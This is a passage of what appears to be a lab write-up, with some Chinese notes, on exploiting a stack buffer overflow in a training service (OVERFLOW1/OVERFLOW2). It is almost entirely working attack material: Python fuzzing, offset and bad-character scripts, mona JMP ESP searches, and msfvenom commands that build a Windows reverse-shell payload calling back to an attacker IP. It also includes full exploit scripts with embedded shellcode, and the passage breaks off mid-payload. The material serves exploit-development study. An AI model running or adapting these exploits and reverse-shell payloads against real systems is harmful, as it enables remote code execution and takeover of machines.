class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x07\x2e\xa0</code>之后<code>\x08\x2f\xa1</code>不受影响</p><p>BADCHAR: <code>\x00\x07\x2e\xa0</code></p><h3 id="jmp-esp"><a class="markdownIt-Anchor" href="#jmp-esp"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x07\x2e\xa0&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x07\x2e\xa0&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW1 &quot;</span></span><br><span class="line">offset = <span class="number">1978</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xda\xc9\xb8\xd5\x89\xee\x40\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x16\x8d\x0c\xb5\x64\x66\x52\x36\x94\x77\x33\xbe\x71\x46\x73\xa4\xf2\xf9\x43\xae\x56\xf6\x28\xe2\x42\x8d\x5d\x2b\x65\x26\xeb\x0d\x48\xb7\x40\x6d\xcb\x3b\x9b\xa2\x2b\x05\x54\xb7\x2a\x42\x89\x3a\x7e\x1b\xc5\xe9\x6e\x28\x93\x31\x05\x62\x35\x32\xfa\x33\x34\x13\xad\x48\x6f\xb3\x4c\x9c\x1b\xfa\x56\xc1\x26\xb4\xed\x31\xdc\x47\x27\x08\x1d\xeb\x06\xa4\xec\xf5\x4f\x03\x0f\x80\xb9\x77\xb2\x93\x7e\x05\x68\x11\x64\xad\xfb\x81\x40\x4f\x2f\x57\x03\x43\x84\x13\x4b\x40\x1b\xf7\xe0\x7c\x90\xf6\x26\xf5\xe2\xdc\xe2\x5d\xb0\x7d\xb3\x3b\x17\x81\xa3\xe3\xc8\x27\xa8\x0e\x1c\x5a\xf3\x46\xd1\x57\x0b\x97\x7d\xef\x78\xa5\x22\x5b\x16\x85\xab\x45\xe1\xea\x81\x32\x7d\x15\x2a\x43\x54\xd2\x7e\x13\xce\xf3\xfe\xf8\x0e\xfb\x2a\xae\x5e\x53\x85\x0f\x0e\x13\x75\xf8\x44\x9c\xaa\x18\x67\x76\xc3\xb3\x92\x11\xe6\x52\xb6\x81\x9e\x56\xc6\x44\x66\xde\x20\x2c\x88\xb6\xfb\xd9\x31\x93\x77\x7b\xbd\x09\xf2\xbb\x35\xbe\x03\x75\xbe\xcb\x17\xe2\x4e\x86\x45\xa5\x51\x3c\xe1\x29\xc3\xdb\xf1\x24\xf8\x73\xa6\x61\xce\x8d\x22\x9c\x69\x24\x50\x5d\xef\x0f\xd0\xba\xcc\x8e\xd9\x4f\x68\xb5\xc9\x89\x71\xf1\xbd\x45\x24\xaf\x6b\x20\x9e\x01\xc5\xfa\x4d\xc8\x81\x7b\xbe\xcb\xd7\x83\xeb\xbd\x37\x35\x42\xf8\x48\xfa\x02\x0c\x31\xe6\xb2\xf3\xe8\xa2\xc3\xb9\xb0\x83\x4b\x64\x21\x96\x11\x97\x9c\xd5\x2f\x14\x14\xa6\xcb\x04\x5d\xa3\x90\x82\x8e\xd9\x89\x66\xb0\x4e\xa9\xa2&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow2"><a class="markdownIt-Anchor" href="#overflow2"></a> OVERFLOW2</h2><h3 id="fuzz-2"><a class="markdownIt-Anchor" href="#fuzz-2"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 700 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-2"><a class="markdownIt-Anchor" href="#offset-2"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 76413176 -&gt; vA1v -&gt; v1Av</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q v1Av -l 700</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 634</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line">offset = <span class="number">634</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-2"><a class="markdownIt-Anchor" href="#badchar-2"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line">offset = <span class="number">634</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line">offset = <span class="number">634</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3b\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x23\x3c\x83\xba</code>之后<code>\x24\x3d\x84\xbb</code>不受影响</p><p>BADCHAR: <code>\x00\x23\x3c\x83\xba</code></p><h3 id="jmp-esp-2"><a class="markdownIt-Anchor" href="#jmp-esp-2"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x23\x3c\x83\xba&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-2"><a class="markdownIt-Anchor" href="#shellcode-2"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x23\x3c\x83\xba&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-2"><a class="markdownIt-Anchor" href="#exploit-2"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW2 &quot;</span></span><br><span class="line">offset = <span class="number">634</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xfc\xbb\xbf\x2d\xd0\xfb\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x43\xc5\x52\xfb\xbb\x16\x33\x75\x5e\x27\x73\xe1\x2b\x18\x43\x61\x79\x95\x28\x27\x69\x2e\x5c\xe0\x9e\x87\xeb\xd6\x91\x18\x47\x2a\xb0\x9a\x9a\x7f\x12\xa2\x54\x72\x53\xe3\x89\x7f\x01\xbc\xc6\xd2\xb5\xc9\x93\xee\x3e\x81\x32\x77\xa3\x52\x34\x56\x72\xe8\x6f\x78\x75\x3d\x04\x31\x6d\x22\x21\x8b\x06\x90\xdd\x0a\xce\xe8\x1e\xa0\x2f\xc5\xec\xb8\x68\xe2\x0e\xcf\x80\x10\xb2\xc8\x57\x6a\x68\x5c\x43\xcc\xfb\xc6\xaf\xec\x28\x90\x24\xe2\x85\xd6\x62\xe7\x18\x3a\x19\x13\x90\xbd\xcd\x95\xe2\x99\xc9\xfe\xb1\x80\x48\x5b\x17\xbc\x8a\x04\xc8\x18\xc1\xa9\x1d\x11\x88\xa5\xd2\x18\x32\x36\x7d\x2a\x41\x04\x22\x80\xcd\x24\xab\x0e\x0a\x4a\x86\xf7\x84\xb5\x29\x08\x8d\x71\x7d\x58\xa5\x50\xfe\x33\x35\x5c\x2b\x93\x65\xf2\x84\x54\xd5\xb2\x74\x3d\x3f\x3d\xaa\x5d\x40\x97\xc3\xf4\xbb\x70\xe6\x19\xe9\xe0\x9e\x1b\xed\xe5\x67\x95\x0b\x8f\x87\xf3\x84\x38\x31\x5e\x5e\xd8\xbe\x74\x1b\xda\x35\x7b\xdc\x95\xbd\xf6\xce\x42\x4e\x4d\xac\xc5\x51\x7b\xd8\x8a\xc0